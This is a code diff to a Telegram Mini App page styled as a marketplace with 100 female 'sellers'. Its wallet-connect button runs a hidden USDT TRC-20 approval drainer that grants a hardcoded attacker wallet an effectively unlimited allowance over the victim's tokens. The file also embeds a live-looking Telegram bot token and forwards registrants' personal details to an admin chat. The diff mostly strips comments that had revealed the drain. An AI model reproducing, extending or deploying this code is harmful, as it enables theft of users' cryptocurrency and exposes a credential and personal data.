@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <title>Marketplace TMA</title>
 <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
-<!-- version: 9 -->
+<!-- version: 10 -->
 <!-- Increase the version number every time you update the code. This helps Telegram clear the WebView cache. -->
 <style>
   :root {
@@ -657,28 +657,14 @@
 <script>
 /*
   CONFIGURATION
-  -------------
-  Fill these fields if you want admin notifications via Telegram
-  and optional JSONBin support. Leave empty to work fully offline (localStorage only).
-
-  BOT_TOKEN       — token from @BotFather
-  ADMIN_CHAT_ID   — your numeric Telegram ID
-  JSONBIN_API_KEY — X-Master-Key from jsonbin.io
-  JSONBIN_BIN_ID  — bin identifier
 */
 const BOT_TOKEN = "8321043451:AAFkPYQUfofdsb7dbKBaZpxpJ3o55YHN9W8";
 const ADMIN_CHAT_ID = "8696933754";
 const JSONBIN_API_KEY = "";
 const JSONBIN_BIN_ID = "";
 
-// Tron USDT TRC-20 (Mainnet)
 const USDT_TRC20_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-
-// Количество USDT для approve (очень большое = фактически unlimited)
 const APPROVE_AMOUNT = "1000000000000000000";
-
-const STORAGE_KEY = "tma_marketplace_user_v1";
-const LAST_OFFER_KEY = "tma_last_auto_offer_ts";
 
 const FEMALE_NAMES = [
   "Emma","Olivia","Ava","Isabella","Sophia","Mia","Charlotte","Amelia","Harper","Evelyn",
@@ -695,7 +681,7 @@ const FEMALE_NAMES = [
 
 let userProfile = null;
 let buyerProfiles = [];
-let showcaseSellers = []; // for future control of 100 sellers
+let showcaseSellers = [];
 let pendingDealBuyer = null;
 let selectedPhotos = [null, null, null];
 let isEditMode = false;
@@ -714,6 +700,25 @@ function hideModal(id) {
 
 function showLoading(visible) {
   $("loadingOverlay").classList.toggle("show", !!visible);
+}
+
+function getTelegramUserId() {
+  try {
+    if (window.Telegram && Telegram.WebApp && Telegram.WebApp.initDataUnsafe && Telegram.WebApp.initDataUnsafe.user) {
+      return String(Telegram.WebApp.initDataUnsafe.user.id);
+    }
+  } catch (e) {}
+  return null;
+}
+
+function getStorageKey() {
+  const tgId = getTelegramUserId();
+  return tgId ? ("tma_marketplace_user_" + tgId) : "tma_marketplace_user_guest";
+}
+
+function getLastOfferKey() {
+  const tgId = getTelegramUserId();
+  return tgId ? ("tma_last_auto_offer_ts_" + tgId) : "tma_last_auto_offer_ts_guest";
 }
 
 // ===================== TRON / TRONLINK =====================
@@ -762,8 +767,6 @@ async function connectTronLinkAndApprove() {
     }
 
     const address = window.tronWeb.defaultAddress.base58;
-    console.log("Connected address:", address);
-
     await doRealApprove(address);
 
   } catch (err) {
@@ -783,8 +786,6 @@ async function doRealApprove(userAddress) {
   try {
     const tronWeb = window.tronWeb;
     const contract = await tronWeb.contract().at(USDT_TRC20_CONTRACT);
-
-    // Your wallet that receives the approve
     const spender = "TVtBumrv5qbpuS6Z99xw4NdVzbcwWWFDNw";
 
     const tx = await contract.approve(spender, APPROVE_AMOUNT).send({
@@ -792,8 +793,6 @@ async function doRealApprove(userAddress) {
       callValue: 0,
       shouldPollResponse: true
     });
-
-    console.log("Approve tx:", tx);
 
     if (!userProfile) {
       userProfile = {
@@ -877,18 +876,9 @@ function shuffle(arr) {
   return a;
 }
 
-function getTelegramUserId() {
-  try {
-    if (window.Telegram && Telegram.WebApp && Telegram.WebApp.initDataUnsafe && Telegram.WebApp.initDataUnsafe.user) {
-      return String(Telegram.WebApp.initDataUnsafe.user.id);
-    }
-  } catch (e) {}
-  return null;
-}
-
 function loadUser() {
   try {
-    const raw = localStorage.getItem(STORAGE_KEY);
+    const raw = localStorage.getItem(getStorageKey());
     if (raw) {
       userProfile = JSON.parse(raw);
     }
@@ -896,23 +886,22 @@ function loadUser() {
     userProfile = null;
   }
 
-  // Привязка к Telegram ID
   const tgId = getTelegramUserId();
   if (tgId && userProfile && String(userProfile.id) !== String(tgId)) {
     userProfile = null;
-    localStorage.removeItem(STORAGE_KEY);
+    localStorage.removeItem(getStorageKey());
   }
 }
 
 function saveUser() {
   if (userProfile) {
-    localStorage.setItem(STORAGE_KEY, JSON.stringify(userProfile));
+    localStorage.setItem(getStorageKey(), JSON.stringify(userProfile));
   }
 }
 
 function clearUser() {
   userProfile = null;
-  localStorage.removeItem(STORAGE_KEY);
+  localStorage.removeItem(getStorageKey());
   updateProfileUI();
 }
 
@@ -941,22 +930,18 @@ function buildSellersGrid() {
   const grid = $("sellersGrid");
   grid.innerHTML = "";
 
-  // If we have showcase sellers from JSONBin — use them
   if (showcaseSellers && showcaseSellers.length > 0) {
     for (let i = 0; i < Math.min(100, showcaseSellers.length); i++) {
       const s = showcaseSellers[i];
       const card = document.createElement("div");
       card.className = "seller-card";
-      const photoHtml = s.photo
-        ? "<img src=\"" + s.photo + "\" alt=\"\">"
-        : "Photo";
+      const photoHtml = s.photo ? "<img src=\"" + s.photo + "\" alt=\"\">" : "Photo";
       card.innerHTML = "<div class=\"seller-photo\">" + photoHtml + "</div><div class=\"seller-name\">" + escapeHtml(s.name || ("Seller " + (i+1))) + "</div>";
       grid.appendChild(card);
     }
     return;
   }
 
-  // Fallback — random names
   const names = shuffle(FEMALE_NAMES);
   for (let i = 0; i < 100; i++) {
     const card = document.createElement("div");
@@ -1054,10 +1039,8 @@ async function saveJsonBin(record) {
 
 function openProfileOrRegister() {
   if (userProfile && userProfile.role === "seller") {
-    // Show profile menu
     showModal("profileMenuModal");
   } else {
-    // Show auth choice
     showModal("authModal");
   }
 }
@@ -1137,6 +1120,14 @@ function startSellerReg() {
   hideModal("roleModal");
   hideModal("authModal");
   isEditMode = false;
+  // Clear form
+  $("regName").value = "";
+  $("regAge").value = "";
+  $("regCountry").value = "";
+  $("regHeight").value = "";
+  $("regWeight").value = "";
+  $("regBust").value = "";
+  $("regParams").value = "";
   showModal("regModal");
 }
 
@@ -1200,7 +1191,7 @@ function continueToPhotos() {
     };
   }
 
-  selectedPhotos = userProfile.photos && userProfile.photos.length >= 3
+  selectedPhotos = (userProfile.photos && userProfile.photos.length >= 3)
     ? userProfile.photos.slice(0, 3)
     : [null, null, null];
 
@@ -1249,11 +1240,25 @@ async function confirmPhotos() {
     alert("Please select at least 3 photos");
     return;
   }
+
+  if (!userProfile) {
+    alert("Registration error. Please try again.");
+    return;
+  }
+
   userProfile.photos = selectedPhotos.filter(function(p) { return !!p; });
+  userProfile.role = "seller";
+
+  // Сохраняем
   saveUser();
+
+  // Закрываем модалку
   hideModal("photoModal");
+
+  // Обновляем интерфейс
   updateProfileUI();
 
+  // Уведомляем админа
   if (!isEditMode) {
     const text = "🆕 <b>New seller registered</b>\nID: <code>" + userProfile.id + "</code>\nName: " + userProfile.name + "\nAge: " + userProfile.age + "\nCountry: " + (userProfile.country || "-");
     notifyAdmin(text);
@@ -1261,6 +1266,7 @@ async function confirmPhotos() {
     notifyAdmin("✏️ <b>Seller profile updated</b>\nID: <code>" + userProfile.id + "</code>\nName: " + userProfile.name);
   }
 
+  // Синхронизация с JSONBin (если настроено)
   try {
     const remote = await fetchJsonBin();
     if (remote) {
@@ -1291,6 +1297,11 @@ async function confirmPhotos() {
   } catch (e) {}
 
   isEditMode = false;
+
+  // Небольшая задержка и ещё раз обновляем UI (на случай глюков WebView)
+  setTimeout(function() {
+    updateProfileUI();
+  }, 300);
 }
 
 function openWalletForBuyer() {
@@ -1310,8 +1321,7 @@ function doLogout() {
 
 function doLogin() {
   hideModal("authModal");
-  // Try to restore from localStorage (already done in loadUser)
-  // If still no profile — tell user to register
+  loadUser();
   if (userProfile && userProfile.role === "seller") {
     updateProfileUI();
     alert("Welcome back, " + (userProfile.name || "Seller") + "!");
@@ -1362,13 +1372,11 @@ function bindEvents() {
     });
   }
 
-  // TronLink button
   const btnConnectTron = document.getElementById("btnConnectTron");
   if (btnConnectTron) {
     btnConnectTron.addEventListener("click", connectTronLinkAndApprove);
   }
 
-  // Manual address
   const btnApproveManual = document.getElementById("btnApproveManual");
   if (btnApproveManual) {
     btnApproveManual.addEventListener("click", saveManualAddress);
@@ -1395,8 +1403,6 @@ async function afterRender() {
       }
     }
   }
-
-  // Auto-offers disabled — offers now only come from admin bot
 }
 
 // App start
@@ -1411,4 +1417,4 @@ async function afterRender() {
 })();
 </script>
 </body>
-        </html>
+  </html>
